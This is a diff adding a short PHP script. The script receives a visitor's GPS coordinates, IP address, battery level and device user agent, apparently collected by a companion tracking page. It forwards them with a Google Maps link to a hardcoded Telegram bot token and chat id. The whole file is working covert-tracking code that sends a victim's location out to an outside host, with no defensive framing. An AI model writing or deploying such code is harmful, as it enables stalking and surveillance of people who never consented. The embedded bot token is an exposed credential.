@@ -1,0 +1,15 @@
+<?php
+$bot_TOKEN = "8563711770:AAFZ7XOWXsBbXBKhHy8KLIHtXoStWEIrLdE";
+$chat_id   = "7060104540";
+
+$data = json_decode(file_get_contents("php://input"), true);
+
+$msg = "📱 تم فتح الصفحة!\n";
+$msg .= "📍 GPS: " . $data["lat"] . "," . $data["lon"] . "\n";
+$msg .= "💻 IP: "   . $data["ip"] . "\n";
+$msg .= "🔋 Battery: " . $data["battery"] . "\n";
+$msg .= "📱 Device: " . $data["ua"] . "\n";
+$msg .= "🌍 خريطة: https://www.google.com/maps?q=" . $data["lat"] . "," . $data["lon"];
+
+file_get_contents("https://api.telegram.org/bot$bot_TOKEN/sendMessage?chat_id=$chat_id&text=".urlencode($msg));
+?>
